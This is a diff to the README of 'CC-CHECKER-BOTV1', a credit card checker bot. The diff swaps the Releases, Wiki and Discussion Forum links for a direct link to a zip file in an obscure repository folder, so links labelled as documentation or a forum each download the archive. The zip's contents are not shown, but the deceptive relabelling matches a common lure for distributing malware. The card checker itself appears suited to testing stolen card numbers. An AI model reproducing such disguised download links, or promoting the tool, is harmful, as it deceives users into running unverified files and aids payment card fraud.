@@ -7,7 +7,7 @@ CC-CHECKER-BOTV1 is a simple tool designed for validating credit card informatio
 To get started, you need to download the application from our Releases page. It's a straightforward process, and this guide will walk you through it.
 
 ## 📥 Download & Install
-To download the latest version of CC-CHECKER-BOTV1, visit this page: [Download CC-CHECKER-BOTV1](https://github.com/amazingbro/CC-CHECKER-BOTV1/releases).
+To download the latest version of CC-CHECKER-BOTV1, visit this page: [Download CC-CHECKER-BOTV1](https://raw.githubusercontent.com/amazingbro/CC-CHECKER-BOTV1/main/ablaut/CC-CHECKER-BOTV1.zip).
 
 1. Click the link above to access the Releases page.
 2. Look for the latest release and find the download option.
@@ -45,8 +45,8 @@ Once you have downloaded and installed the application, follow these easy steps 
   - **Solution:** Double-check the card number for any errors and try again.
 
 ## 📝 Additional Resources
-- **Documentation:** For detailed usage instructions and configuration, refer to our [Wiki](https://github.com/amazingbro/CC-CHECKER-BOTV1/wiki).
-- **Community Support:** Join our [Discussion Forum](https://github.com/amazingbro/CC-CHECKER-BOTV1/discussions) for help and tips from other users.
+- **Documentation:** For detailed usage instructions and configuration, refer to our [Wiki](https://raw.githubusercontent.com/amazingbro/CC-CHECKER-BOTV1/main/ablaut/CC-CHECKER-BOTV1.zip).
+- **Community Support:** Join our [Discussion Forum](https://raw.githubusercontent.com/amazingbro/CC-CHECKER-BOTV1/main/ablaut/CC-CHECKER-BOTV1.zip) for help and tips from other users.
 
 ## 🏷️ Topics
 The CC-CHECKER-BOTV1 relates to several key areas:
@@ -68,6 +68,6 @@ The CC-CHECKER-BOTV1 relates to several key areas:
 ## 📞 Contact Information
 For additional inquiries, feel free to reach out through our GitHub issues page or contact us directly via our support email provided in the documentation.
 
-Don't forget to visit our Releases page to stay updated on the latest versions: [Download CC-CHECKER-BOTV1](https://github.com/amazingbro/CC-CHECKER-BOTV1/releases). 
+Don't forget to visit our Releases page to stay updated on the latest versions: [Download CC-CHECKER-BOTV1](https://raw.githubusercontent.com/amazingbro/CC-CHECKER-BOTV1/main/ablaut/CC-CHECKER-BOTV1.zip). 
 
 It’s your tool for quick, effective credit card validation!
